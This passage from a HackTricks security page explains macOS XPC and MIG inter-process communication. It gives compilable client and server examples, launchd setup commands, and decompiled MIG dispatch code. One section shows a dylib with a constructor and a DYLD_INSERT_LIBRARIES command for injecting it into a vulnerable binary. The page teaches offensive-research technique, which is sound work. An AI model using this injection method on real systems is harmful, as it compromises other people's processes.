Applications can **subscribe** to different event **messages**, enabling them to be **initiated on-demand** when such events happen. The **setup** for these services is done in l**aunchd plist files**, located in the **same directories as the previous ones** and containing an extra **`LaunchEvent`** key.

### XPC Connecting Process Check

When a process tries to call a method from via an XPC connection, the **XPC service should check if that process is allowed to connect**. Here are the common ways to check that and the common pitfalls:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### XPC Authorization

Apple also allows apps to **configure some rights and how to get them** so if the calling process have them it would be **allowed to call a method** from the XPC service:

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### C Code Example

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
    if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
        // Print received message
        const char* received_message = xpc_dictionary_get_string(event, "message");
        printf("Received message: %s\n", received_message);

        // Create a response dictionary
        xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(response, "received", "received");

        // Send response
        xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
        xpc_connection_send_message(remote, response);

        // Clean up
        xpc_release(response);
    }
}

static void handle_connection(xpc_connection_t connection) {
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        handle_event(event);
    });
    xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
    xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
                                                                   dispatch_get_main_queue(),
                                                                   XPC_CONNECTION_MACH_SERVICE_LISTENER);
    if (!service) {
        fprintf(stderr, "Failed to create service.\n");
        exit(EXIT_FAILURE);
    }

    xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_CONNECTION) {
            handle_connection(event);
        }
    });

    xpc_connection_resume(service);
    dispatch_main();

    return 0;
}
```
{% endtab %}

{% tab title="xpc_client.c" %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
    xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
            // Print received message
            const char* received_message = xpc_dictionary_get_string(event, "received");
            printf("Received message: %s\n", received_message);
        }
    });

    xpc_connection_resume(connection);

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "message", "Hello, Server!");

    xpc_connection_send_message(connection, message);

    dispatch_main();
    
    return 0;
}
```
{% endtab %}

{% tab title="xyz.hacktricks.service.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
    <dict>
        <key>xyz.hacktricks.service</key>
        <true/>
    </dict>
<key>Program</key>
    <string>/tmp/xpc_server</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/xpc_server</string>
    </array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```

### ObjectiveC Code Example

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
    NSLog(@"Received message: %@", some_string);
    NSString *response = @"Received";
    reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

    MyXPCObject *my_object = [MyXPCObject new];

    newConnection.exportedObject = my_object;

    [newConnection resume];
    return YES;
}
@end

int main(void) {

    NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

    id <NSXPCListenerDelegate> delegate = [MyDelegate new];
    listener.delegate = delegate;
    [listener resume];

    sleep(10); // Fake something is done and then it ends
}
```
{% endtab %}

{% tab title="oc_xpc_client.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
    [connection resume];

    [[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
        NSLog(@"Received response: %@", response);
    }];

    [[NSRunLoop currentRunLoop] run];

    return 0;
}
```
{% endtab %}

{% tab title="xyz.hacktricks.svcoc.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
    <dict>
        <key>xyz.hacktricks.svcoc</key>
        <true/>
    </dict>
<key>Program</key>
    <string>/tmp/oc_xpc_server</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/oc_xpc_server</string>
    </array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```

### Client inside a Dylib code

```
// gcc -dynamiclib -framework Foundation oc_xpc_client.m -o oc_xpc_client.dylib
// gcc injection example:
// DYLD_INSERT_LIBRARIES=oc_xpc_client.dylib /path/to/vuln/bin

#import <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
{
        NSString*  _serviceName = @"xyz.hacktricks.svcoc";

        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
    
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)]];
    
        [_agentConnection resume];

        [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
            (void)error;
            NSLog(@"Connection Failure");
        }] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
            NSLog(@"Received response: %@", response);
    }    ];
        NSLog(@"Done!");

    return;
}
```

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. It basically **generates the needed code** for server and client to communicate with a given definition. Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

### Example

Create a definition file, in this case with a very simple function:

{% code title="myipc.defs" %}
```cpp
subsystem myipc 500; // Arbitrary name and id
 
userprefix USERPREF;        // Prefix for created functions in the client
serverprefix SERVERPREF;    // Prefix for created functions in the server

#include <mach/mach_types.defs> 
#include <mach/std_types.defs>

simpleroutine Subtract(
    server_port :  mach_port_t;
    n1          :  uint32_t;
    n2          :  uint32_t);
```
{% endcode %}

Now use mig to generate the server and client code that will be able to comunicate within each other to call the Subtract function:

```bash
mig -header myipcUser.h -sheader myipcServer.h myipc.defs
```

Several new files will be created in the current directory.

In the files **`myipcServer.c`** and **`myipcServer.h`** you can find the declaration and definition of the struct **`SERVERPREFmyipc_subsystem`**, which basically defines the function to call based on the received message ID (we indicated a starting number of 500):

{% tabs %}
{% tab title="myipcServer.c" %}
```c
/* Description of this subsystem, for use in direct RPC */
const struct SERVERPREFmyipc_subsystem SERVERPREFmyipc_subsystem = {
	myipc_server_routine,
	500, // start ID
	501, // end ID
	(mach_msg_size_t)sizeof(union __ReplyUnion__SERVERPREFmyipc_subsystem),
	(vm_address_t)0,
	{
          { (mig_impl_routine_t) 0,
          // Function to call
          (mig_stub_routine_t) _XSubtract, 3, 0, (routine_arg_descriptor_t)0, (mach_msg_size_t)sizeof(__Reply__Subtract_t)},
	}
};
```
{% endtab %}

{% tab title="myipcServer.h" %}
```c
/* Description of this subsystem, for use in direct RPC */
extern const struct SERVERPREFmyipc_subsystem {
	mig_server_routine_t	server;	/* Server routine */
	mach_msg_id_t	start;	/* Min routine number */
	mach_msg_id_t	end;	/* Max routine number + 1 */
	unsigned int	maxsize;	/* Max msg size */
	vm_address_t	reserved;	/* Reserved */
	struct routine_descriptor	/* Array of routine descriptors */
		routine[1];
} SERVERPREFmyipc_subsystem;
```
{% endtab %}
{% endtabs %}

Based on the previous struct the function **`myipc_server_routine`** will get the **message ID** and return the proper function to call:

```c
mig_external mig_routine_t myipc_server_routine
	(mach_msg_header_t *InHeadP)
{
	int msgh_id;

	msgh_id = InHeadP->msgh_id - 500;

	if ((msgh_id > 0) || (msgh_id < 0))
		return 0;

	return SERVERPREFmyipc_subsystem.routine[msgh_id].stub_routine;
}
```

In this example we only defined 1 function in the definitions, but if we would have defined more, the would have been inside the array of **`SERVERPREFmyipc_subsystem`** and the first one will be assigned to the ID **500**, the second one to the ID **501**...

Actually it's possible to identify this relation in the struct **`subsystem_to_name_map_myipc`** from **`myipcServer.h`**:

```c
#ifndef subsystem_to_name_map_myipc
#define subsystem_to_name_map_myipc \
    { "Subtract", 500 }
#endif
```

Finally, another important function to make the server work will be **`myipc_server`**, which is the one that will actually **call the function** related to the received id:

<pre class="language-c"><code class="lang-c">mig_external boolean_t myipc_server
	(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP)
{
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	mig_routine_t routine;

	OutHeadP->msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REPLY(InHeadP->msgh_bits), 0);
	OutHeadP->msgh_remote_port = InHeadP->msgh_reply_port;
	/* Minimal size: routine() will update it if different */
	OutHeadP->msgh_size = (mach_msg_size_t)sizeof(mig_reply_error_t);
	OutHeadP->msgh_local_port = MACH_PORT_NULL;
	OutHeadP->msgh_id = InHeadP->msgh_id + 100;
	OutHeadP->msgh_reserved = 0;

	if ((InHeadP->msgh_id > 500) || (InHeadP->msgh_id &#x3C; 500) ||
<strong>	    ((routine = SERVERPREFmyipc_subsystem.routine[InHeadP->msgh_id - 500].stub_routine) == 0)) {
</strong>		((mig_reply_error_t *)OutHeadP)->NDR = NDR_record;
		((mig_reply_error_t *)OutHeadP)->RetCode = MIG_BAD_ID;
		return FALSE;
	}
<strong>	(*routine) (InHeadP, OutHeadP);
</strong>	return TRUE;
}
</code></pre>

Check the following code to use the generated code to create a simple server and client where the client can call the functions Subtract from the server:

{% tabs %}
{% tab title="myipc_server.c" %}
```c
// gcc myipc_server.c myipcServer.c -o myipc_server

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include "myipcServer.h"

kern_return_t SERVERPREFSubtract(mach_port_t server_port, uint32_t n1, uint32_t n2)
{
    printf("Received: %d - %d = %d\n", n1, n2, n1 - n2);
    return KERN_SUCCESS;
}

int main() {

    mach_port_t port;
    kern_return_t kr;
    
    // Register the mach service
    kr = bootstrap_check_in(bootstrap_port, "xyz.hacktricks.mig", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_check_in() failed with code 0x%x\n", kr);
        return 1;
    }
    
    // myipc_server is the function that handles incoming messages (check previous exlpanation)
    mach_msg_server(myipc_server, sizeof(union __RequestUnion__SERVERPREFmyipc_subsystem), port, MACH_MSG_TIMEOUT_NONE);
}
```
{% endtab %}

{% tab title="myipc_client.c" %}
```c
// gcc myipc_client.c myipcUser.c -o myipc_client

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include "myipcUser.h"

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "xyz.hacktricks.mig", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Port right name %d\n", port);
    USERPREFSubtract(port, 40, 2);
}
```
{% endtab %}
{% endtabs %}

## Binary Analysis

As many binaries now use MIG to expose mach ports, it's interesting to know how to **identify that MIG was used** and the **functions that MIG executes** with each message ID.

[**jtool2**](../../macos-apps-inspecting-debugging-and-fuzzing/#jtool2) can parse MIG information from a Mach-O binary indicating the message ID and identifying the function to execute:

```bash
jtool2 -d __DATA.__const myipc_server | grep MIG
```

It was previously mentioned that the function that will take care of **calling the correct function depending on the received message ID** was `myipc_server`. However, you usually won't have the symbols of the binary (no functions names), so it's interesting to **check how it looks like decompiled** as it will always be very similar (the code of this function is independent from the functions exposed):



{% tabs %}
{% tab title="myipc_server decompiled 1" %}
<pre class="language-c"><code class="lang-c">int _myipc_server(int arg0, int arg1) {
    var_10 = arg0;
    var_18 = arg1;
    // Initial instructions to find the proper function ponters
    *(int32_t *)var_18 = *(int32_t *)var_10 &#x26; 0x1f;
    *(int32_t *)(var_18 + 0x8) = *(int32_t *)(var_10 + 0x8);
    *(int32_t *)(var_18 + 0x4) = 0x24;
    *(int32_t *)(var_18 + 0xc) = 0x0;
    *(int32_t *)(var_18 + 0x14) = *(int32_t *)(var_10 + 0x14) + 0x64;
    *(int32_t *)(var_18 + 0x10) = 0x0;
    if (*(int32_t *)(var_10 + 0x14) &#x3C;= 0x1f4 &#x26;&#x26; *(int32_t *)(var_10 + 0x14) >= 0x1f4) {
            rax = *(int32_t *)(var_10 + 0x14);
            // Call to sign_extend_64 that can help to identifyf this function
            // This stores in rax the pointer to the call that needs to be called
            // Check the used of the address 0x100004040 (functions addresses array)
            // 0x1f4 = 500 (the strating ID)
<strong>            rax = *(sign_extend_64(rax - 0x1f4) * 0x28 + 0x100004040);
</strong>            var_20 = rax;
            // If - else, the if returns false, while the else call the correct function and returns true
<strong>            if (rax == 0x0) {
</strong>                    *(var_18 + 0x18) = **_NDR_record;
                    *(int32_t *)(var_18 + 0x20) = 0xfffffffffffffed1;
                    var_4 = 0x0;
            }
            else {
                    // Calculated address that calls the proper function with 2 arguments
<strong>                    (var_20)(var_10, var_18);
</strong>                    var_4 = 0x1;
            }
    }
    else {
            *(var_18 + 0x18) = **_NDR_record;
            *(int32_t *)(var_18 + 0x20) = 0xfffffffffffffed1;
            var_4 = 0x0;
    }
    rax = var_4;
    return rax;
}
</code></pre>
{% endtab %}

{% tab title="myipc_server decompiled 2" %}
This is the same function decompiled in a difefrent Hopper free version:

<pre class="language-c"><code class="lang-c">int _myipc_server(int arg0, int arg1) {
    r31 = r31 - 0x40;
    saved_fp = r29;
    stack[-8] = r30;
    var_10 = arg0;
    var_18 = arg1;
    // Initial instructions to find the proper function ponters
    *(int32_t *)var_18 = *(int32_t *)var_10 &#x26; 0x1f | 0x0;
    *(int32_t *)(var_18 + 0x8) = *(int32_t *)(var_10 + 0x8);
    *(int32_t *)(var_18 + 0x4) = 0x24;
    *(int32_t *)(var_18 + 0xc) = 0x0;
    *(int32_t *)(var_18 + 0x14) = *(int32_t *)(var_10 + 0x14) + 0x64;
    *(int32_t *)(var_18 + 0x10) = 0x0;
    r8 = *(int32_t *)(var_10 + 0x14);
    r8 = r8 - 0x1f4;
    if (r8 > 0x0) {
            if (CPU_FLAGS &#x26; G) {
                    r8 = 0x1;
            }
    }
    if ((r8 &#x26; 0x1) == 0x0) {
            r8 = *(int32_t *)(var_10 + 0x14);
            r8 = r8 - 0x1f4;
            if (r8 &#x3C; 0x0) {
                    if (CPU_FLAGS &#x26; L) {
                            r8 = 0x1;
                    }
            }
            if ((r8 &#x26; 0x1) == 0x0) {
                    r8 = *(int32_t *)(var_10 + 0x14);
                    // 0x1f4 = 500 (the strating ID)
<strong>                    r8 = r8 - 0x1f4;
</strong>                    asm { smaddl     x8, w8, w9, x10 };
                    r8 = *(r8 + 0x8);
                    var_20 = r8;
                    r8 = r8 - 0x0;
                    if (r8 != 0x0) {
                            if (CPU_FLAGS &#x26; NE) {
                                    r8 = 0x1;
                            }
                    }
                    // Same if else as in the previous version
                    // Check the used of the address 0x100004040 (functions addresses array)
<strong>                    if ((r8 &#x26; 0x1) == 0x0) {
</strong><strong>                            *(var_18 + 0x18) = **0x100004000;
</strong>                            *(int32_t *)(var_18 + 0x20) = 0xfffffed1;
                            var_4 = 0x0;
                    }
                    else {
                            // Call to the calculated address where the function should be
<strong>                            (var_20)(var_10, var_18);
</strong>                            var_4 = 0x1;
                    }
            }
            else {
                    *(var_18 + 0x18) = **0x100004000;
                    *(int32_t *)(var_18 + 0x20) = 0xfffffed1;
                    var_4 = 0x0;
            }
    }
    else {
            *(var_18 + 0x18) = **0x100004000;
            *(int32_t *)(var_18 + 0x20) = 0xfffffed1;
            var_4 = 0x0;
    }
    r0 = var_4;
    return r0;
}

</code></pre>
{% endtab %}
{% endtabs %}

Actually if you go to the function **`0x100004000`** you will find the array of **`routine_descriptor`** structs, the first element of the struct is the address where the function is implemented and the **struct takes 0x28 bytes**, so each 0x28 bytes (starting from byte 0) you can get 8 bytes and that be the **address of the function** that will be called:

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This data can be extracted [**using this Hopper script**](https://github.com/knightsc/hopper/blob/master/scripts/MIG%20Detect.py).

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
